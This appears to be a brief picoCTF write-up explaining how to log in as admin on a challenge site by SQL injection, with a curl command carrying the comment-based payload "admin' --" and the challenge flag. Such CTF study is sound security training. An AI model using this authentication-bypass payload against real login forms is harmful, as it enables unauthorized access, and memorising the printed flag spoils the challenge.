# Solution

The same solution as Irish-Name-Repo-1 is not possible as password is filtered, and there is also SQL injection detection enabled.

Instead of inserting a boolean expression in the password, all we have to do is login as admin.

```bash
$ curl 'https://jupiter.challenges.picoctf.org/problem/52849/login.php' --data "username=admin' --&password=1&debug=1"
```

Our flag is `picoCTF{m0R3_SQL_plz_fa983901}`